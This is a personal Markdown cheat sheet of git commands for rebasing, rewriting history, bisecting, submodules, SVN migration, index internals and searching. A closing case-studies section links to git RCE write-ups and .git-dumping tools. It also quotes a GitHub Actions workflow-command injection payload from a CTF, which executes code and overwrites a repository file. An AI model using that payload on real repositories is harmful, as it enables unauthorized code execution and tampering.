# Deleting commits

```bash
# order
# 1. r
# 2. fixup/squash
# 3. fixup/squash
git rebase -i HEAD^
# ||
git rebase -i HEAD~3

# [optional]
git rebase --edit-todo
git rebase --continue
git rebase origin master

# up to root
git rebase -i --root master
```

### Changing author

```bash
# find commits 
git log --format='%H %an %ae' | cat -v -
# || using interactive rebase
# order
# 1. e
git rebase -i HEAD^

git commit --amend --author="foo <>"
git rebase --continue
git push --force

# ||
git filter-repo --force --commit-callback '
    commit.author_name = b"foo"
    commit.author_email = b""
    commit.committer_name = b"foo"
    commit.committer_email = b""
'
```

# Deny push --force

```bash
git config --system receive.denyDeletes true
git config --system receive.denyNonFastForwards true

git log -G 'source_searches_cwd' general.c
git diff 3185942a~ 3185942a general.c
```

- [Git pre\-push hook to prevent force pushing master branch · GitHub](https://gist.github.com/pixelhandler/5718585)
    - ~/code/snippets/git/pre-receive.deny-force-push-to-branches

# Add existing repository to remote

```bash
git remote add github git@github.com:nevesnunes/foo.git
git remove -v
git push github master
```

# Apply gitignore changes

```bash
git rm --cached -f -r .

git add -A
git status
```

# Remove objects

```bash
# directories
git clean -fd

# ignored files
git clean -fX

# ignored and non-ignored files
git clean -fx

# rewrite history by object ids
p=foo/bar \
&& git log --all --pretty=format:%H -- "$p" \
    | xargs -I{} git ls-tree {} "$p" \
    | awk '{print $3}' \
    | xargs -I{} bash -c 'java \
        -jar ~/opt/bfg.jar \
        --delete-files \
        --no-blob-protection \
        --strip-blobs-with-ids <(printf "%s\n" "$1") .' _ {}
```

- [GitHub \- newren/git\-filter\-repo: Quickly rewrite git repository history \(filter\-branch replacement\)](https://github.com/newren/git-filter-repo)
- [GitHub \- rtyley/bfg\-repo\-cleaner: Removes large or troublesome blobs like git\-filter\-branch does, but faster\. And written in Scala](https://github.com/rtyley/bfg-repo-cleaner)
- [Removing and purging files from git history \- Stephen Ostermiller](https://blog.ostermiller.org/removing-and-purging-files-from-git-history/)

# interactive mode

- patch: pick hunks (i.e. blocks of lines) to add to commit
    - stage: `e` = pick lines in current hunk

```bash
git add --patch ./foo
git commit -m '.'
```

- https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git
- https://stackoverflow.com/questions/6276752/can-i-split-an-already-split-hunk-with-git

# cherry-pick

- copies commits from one branch to another branch

### Pull request

```bash
# 1. Update devel, to ensure you have the commit to cherry pick:
git checkout devel
git --fetch upstream
git merge upstream/devel
git checkout $old_release_from_stable
git pull
git checkout -b cherry-pick/2.5/$pr_number_from_devel
git cherry-pick -x $sha_from_devel

# 2. Add a changelog entry for the change, and commit it

# 3. Push your branch to your fork:
git push origin cherry-pick/2.5/$pr_number_from_devel

# 4. Submit PR for cherry-pick/2.5/$pr_number_from_devel against the stable-2.5 branch
```

### Multiple commits

```bash
git checkout $devel_branch
# reset branch to f (currently includes a)
git reset --hard f
# rebase every commit after b and transplant it onto a
git rebase --onto a b
```

https://stackoverflow.com/questions/1670970/how-to-cherry-pick-multiple-commits/12646996#12646996

# list files by commit info

```bash
# last commit date
ls -1 foo* | while read -r i; do printf '%s ' "$i" && git log -1 --format=%cd "$i" | cat -v -; done
```

# list submodule commits

```bash
git log -p --submodule=log | awk '
/^commit/ { add=1 } # Start of commit message
/^diff --git/ { add=0 } # Start of diff snippet
{ if (add) { buf = buf "\n" $0 } } # Add lines if part of commit message
END { print buf }
'
```

# gitlab ci local

```bash
(
cd ~/opt
wget https://s3.amazonaws.com/gitlab-runner-downloads/master/binaries/gitlab-runner-linux-amd64
chmod +x gitlab-runner-linux-amd64
)
gitlab-runner register --executor docker --docker-image foo
# Input: gitlab-ci.yml job name = foo
gitlab-runner exec docker --docker-pull-policy="if-not-present" ...
gitlab-runner exec shell foo
```

[gitlab\-runner exec: easily test builds locally \(\#312\) · Issues · GitLab\.org / gitlab\-runner · GitLab](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/312)

# bisect

### manually marked by user

```bash
# begin
git bisect start
git bisect good 012345678
git bisect bad 012345679

# for each automatic checkout
git bisect good
# ||
git bisect bad

# end
git bisect reset
```

### automatically marked by script

```bash
git bisect start 012345678 012345679
git bisect run ./test.sh
```

For each automatic checkout:

- on exit status = 0, mark checkout as `good`
- on exit status > 0, mark checkout as `bad`

# submodules

```bash
# Add reference in main repository
git submodule add git@github.com:foo.git foo
cd foo
git checkout foo_branch
cd ..
git add -A
commit -va

# On another main repository checkout
git pull
git submodule update --init --recursive
```

# Migrate SVN to GIT

```bash
svn log --quiet http://foo.com/trunk/foo_project | \
    awk '/^r/{print $3" = foo_user <foo_user@foo_host>"} {next}' | \
    sort -u \
    > authors-transform.txt
git svn clone http://foo.com/ \
    -A authors-transform.txt \
    --tags=./tags/foo_project/ \
    --trunk=./trunk/foo_project/ \
    --username foo_user \
    foo_project
git svn show-ignore -i trunk > .gitignore
git add .gitignore
git commit -m 'Convert svn:ignore to .gitignore'
```

### sync commits

```bash
git svn rebase
git pull
git push
```

# unable to stat just written file

```bash
git log -p $file

git checkout -- $file
# ||
git show $rev:$file > $file
git clean -d -f .
git reset HEAD $file
git add $file

# ||
git checkout -b wat
git add --force .
git commit -m "wat"
git checkout master
git branch -D wat
```

- [cause] silent quarantine by antivirus
    - ~/Downloads/git-antivirus-silent_rm_file.CSV
    - procmon
        ```
        ekrn.exe | SetDispositionInformationFile | C:\Users\foo\code\src\PowerShell-lazywinadmin\foo | SUCCESS | Delete: True
        ```

# index

```bash
# files in index
git ls-files --stage
# files in working tree
git ls-tree -r HEAD
```

https://mincong.io/2018/04/28/git-index/

# Validate tracked changes

```bash
# xref changes
git reflog show HEAD
# ! git symbolic-ref HEAD | grep -q refs/heads/master
git reflog show master
git reflog show stash
git reflog show --all

# compare files in working tree and index
git diff-files

# rebuild index for a given file
git update-index --no-assume-unchanged path/to/file
# || git update-index --no-skip-worktree path/to/file
git rm --cached path/to/file
git reset path/to/file
# || git add -f path/to/file

# rebuild and validate index
git update-index --unmerged --refresh
git ls-files --cached --exclude-standard
git diff-files
git ls-files --others --exclude-standard

# checksum
diff -auw \
    <(git ls-tree -r HEAD | \
        awk '{for(i=3; i<=NF; ++i) printf $i""FS; print ""}') \
    <(git ls-tree -r --name-only HEAD | \
        xargs -n1 sh -c 'echo "$(git hash-object "$1")" "$1"' _)

# author date before file modification date
paste -d '\n' \
    <(git ls-tree -r --name-only HEAD | \
        xargs -n1 sh -c 'echo "$(git log -1 --format="%at" -- "$1")" "$1"' _) \
    <(git ls-tree -r --name-only HEAD | \
        xargs -n1 sh -c 'echo "$(stat --format='%Y' -- "$1")" "$1"' _) | \
    xargs -L2 sh -c '[ "$1" -lt "$3" ] && printf "%s\n%s" "$1 $2" "$3 $4"' _

# commit date before file modification date
paste -d '\n' \
    <(git ls-tree -r --name-only HEAD | \
        xargs -n1 sh -c 'echo "$(git log -1 --format="%ct" -- "$1")" "$1"' _) \
    <(git ls-tree -r --name-only HEAD | \
        xargs -n1 sh -c 'echo "$(stat --format='%Y' -- "$1")" "$1"' _) | \
    xargs -L2 sh -c '[ "$1" -lt "$3" ] && printf -- "%s\n%s" "$1 $2" "$3 $4"' _
```

# manual index blob hash

```bash
git-hash-object () {
    local type=blob
    [ "$1" = "-t" ] && shift && type=$1 && shift
    # depending on eol/autocrlf settings, you may want to substitute CRLFs by LFs
    # by using `perl -pe 's/\r$//g'` instead of `cat` in the next 2 commands
    local size=$(cat $1 | wc -c | sed 's/ .*$//')
    ( echo -en "$type $size\0"; cat "$1" ) | sha1sum | sed 's/ .*$//'
}
git-hash-object ./foo

# https://matthew-brett.github.io/curious-git/reading_git_objects.html
git ls-files --stage | xargs -L1 sh -c '
dirname=$(echo "$2" | cut -c-2)
filename=$(echo "$2" | cut -c3-)
echo ".git/objects/$dirname/$filename"
' _ | xargs -I{} python3 -c '
import sys, zlib
print(zlib.decompress(open(sys.argv[1], "rb").read()))
' {}

git ls-files --stage | xargs -L1 sh -c '
dirname=$(echo "$2" | cut -c-2)
filename=$(echo "$2" | cut -c3-)
echo ".git/objects/$dirname/$filename"
' _ | xargs -I{} python3 -c '
from hashlib import sha1
import sys, zlib
print(sha1(zlib.decompress(open(sys.argv[1], "rb").read())).hexdigest())
' {}
```

```python
def git_blob_hash(data):
    if isinstance(data, str):
        data = data.encode()
    data = data.replace('\r\n', '\n')
    data = b'blob ' + str(len(data)).encode() + b'\0' + data
    h = hashlib.sha1()
    h.update(data)
    return h.hexdigest()
```

# decompress objects

```bash
# [Optional] On packed objects
mkdir -p .pack
find .git/objects/pack/ -type f -iname '*.pack' \
    | while IFS= read -r i; do
    mv "$i" .pack/
    git unpack-objects < .pack/"$i"
done

find .git/objects/ -type f | xargs -I{} python3 -c '
import sys, zlib
print(zlib.decompress(open(sys.argv[1], "rb").read()))
' {} | vim -

# Alternative
git unpack-objects < PACKFILE
git cat-file --batch-all-objects --batch-check  # Take $blob_id
git cat-file -p $blob_id
```

# show changes in commit

https://stackoverflow.com/questions/17563726/how-to-see-the-changes-in-a-git-commit

```bash
git diff COMMIT~ COMMIT
git diff COMMIT^!
git show COMMIT
```

# make changes without overwriting dirty state

```bash
git diff --exit-code &&
    vim ./foo &&
    ! git diff --quiet ./foo &&
    git commit -qm 'sync' ./foo &&
    git pull -q --rebase &&
    git push -q
```

# clone using ssh key

```bash
git clone git@foo.com:foo-team/foo.git
```

# push to multiple remotes

```bash
# add urls
git remote add all $remote_url
git remote set-url all -push -add $remote_url_1
git remote set-url all -push -add $remote_url_2
# || group remotes
git config –add remote.all.url $remote_url_1
git config –add remote.all.url $remote_url_2

git push all master

# validation
git remote -v
```

# grep / search

```bash
# across commits / history
query=
git rev-list --all | xargs -I{} git grep "$query" {}
subtree=
git rev-list --all -- "$subtree" | xargs -I{} git grep "$query" {} -- "$subtree"

# across branches
query=
git show-ref --heads | awk '{print $2}' | xargs -I{} git grep "$query" {}
# ||
git log -S foo -c
git log -S foo --all -- '*.js'

# changes of specific commit
git log -1 -c $sha1sum

# by filetype, from worktree root
git grep foo -- '/*.js' '/*.cs'
```

https://stackoverflow.com/questions/2928584/how-to-grep-search-committed-code-in-the-git-history

# dump public repository from site

- [GitHub \- internetwache/GitTools: A repository with 3 tools for pwn&\#39;ing websites with \.git repositories available](https://github.com/internetwache/GitTools)
- [GitHub \- arthaud/git\-dumper: A tool to dump a git repository from a website](https://github.com/arthaud/git-dumper)

# case studies

- [shell: disallow repo names beginning with dash](https://git.kernel.org/pub/scm/git/git.git/commit/?id=3ec804490a265f4c418a321428c12f3f18b7eff5)
- https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/
- https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa

- [GitHub \- newren/git\-filter\-repo: Quickly rewrite git repository history \(filter\-branch replacement\)](https://github.com/newren/git-filter-repo)
- [GitHub \- Kayvlim/badrepo: Don&\#39;t clone this on a Mac\. Test repository to play around with glitches](https://github.com/Kayvlim/badrepo)
    - issues on `git status` under macos: different results when run twice: either no changes, or one of the files has been modified, or one of the files has been deleted...
        - Feb 10, 2015
    - https://twitter.com/kayvlim/status/565234659081338881
        > Create two files in a #git repository with equal names, but differing a letter: á = U+00E1; á = U+0061 U+0301. Clone on a mac. #UnicodeHell
    - ~/code/guides/sysadmin/badrepo

### github

- Workflow command processing from stdout payload triggers SSTI
    - [GitHub Capture the Flag results \- The GitHub Blog](https://github.blog/2021-03-22-github-ctf-results/)
    ```
    Given workflow steps containing:

    script: |
        console.log(process.env.COMMENT_BODY)
    script: |
        const id = ${{ steps.comment_log.outputs.COMMENT_ID }} // line 30

    Then post comment with payload:

    ::set-output name=COMMENT_ID::1; console.log(context); console.log(process); await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: 'incrediblysecureinc', repo: 'incredibly-secure-Creastery', path: 'README.md', message: 'Escalated to Read-write Access', content: Buffer.from('Pwned!').toString('base64'), sha: '959c46eb0fbab9ab5b5bfb279ab6d70f720d1207' })
    ```
- [Issue 2070: Github: Widespread injection vulnerabilities in Actions](https://bugs.chromium.org/p/project-zero/issues/detail?id=2070)
- https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html
- https://devcraft.io/2020/10/19/github-gist-account-takeover.html

### pull request triggers a merge push

- [😳 by stephen304 · Pull Request \#8142 · github/dmca · GitHub](https://github.com/github/dmca/pull/8142)
- https://mathieularose.com/github-commit-injection
- https://news.ycombinator.com/item?id=24883944
    > I think it's because GitHub wants to allow repo maintainers to merge in PRs without them having to add separate remotes themselves, ie `git remote add` isn't required to `git merge`.
    > This basically means that any content can be injected into anyone's GH repo (since PRs can't be turned off), but really only in terms of being able to view it on the GitHub website. To give an example, pull 437 on torvalds/linux[0] hasn't been merged in, but if you go to the commit hash in the browser, suddenly main/init.c has the relevant changes and commit that condense the file into one line[1].
    > [0]: https://github.com/torvalds/linux/pull/437
    > [1]: https://github.com/torvalds/linux/blob/2793ae1df012c7c3f13ea5c0f0adb99017999c3b/init/main.c

### explaining internals

- https://lobste.rs/s/bxvx44/explain_git_with_d3
- https://lobste.rs/s/nv7p4k/dancing_git_how_explain_git_depth
- [How to teach Git | Hacker News](https://news.ycombinator.com/item?id=18919599)
- [Learn Git Branching | Hacker News](https://news.ycombinator.com/item?id=5937994)
- [A successful Git branching model \(2010\) | Hacker News](https://news.ycombinator.com/item?id=15376841)
- [Oh shit, git: Getting myself out of bad situations | Hacker News](https://news.ycombinator.com/item?id=15951825)
- [Some bad Git situations and how I got myself out of them | Hacker News](https://news.ycombinator.com/item?id=12459755)
